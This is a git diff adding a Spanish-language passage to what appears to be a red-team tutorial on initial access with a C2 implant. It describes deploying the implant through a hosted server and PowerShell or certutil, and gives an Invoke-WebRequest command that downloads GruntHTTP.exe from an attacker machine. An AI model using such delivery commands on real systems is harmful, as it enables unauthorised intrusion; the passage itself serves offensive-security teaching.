@@ -83,8 +83,31 @@ Debemos especificar el listener, entre otros apartados. Y generamos nuestro prim
 
 Una vez generado y descargado en nuestra máquina local, debemos enviarlo  al equipo del usuario.
 
+Depende del escenario que nos encontremos, debemos realizar unas técnicas u otras.
 
-Continuará...
+
+Puede dar el caso, que tuviesemos acceso interno dentro de la organización, en este caso deberíamos desplegar el implante, esto es posible, levantando un servidor y realizando la descarga vía powershell , o  del binario certutil.exe 
+
+A la hora de realizar este ejercicio, Windows Defenders saltará y nos eliminará el implante.
+
+![image006.png](/uploads/InitialAccess/image006.png)
+
+En este ejemplo, utilizamos la expresión:
+
+Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
+
+![image007.png](/uploads/InitialAccess/image007.png)
+
+Como vemos, se detecta una creación del fichero, y acto seguido la conexión a nuestro equipo
+
+![image008.png](/uploads/InitialAccess/image008.png)
+
+
+
+
+
+
+
 
 
 
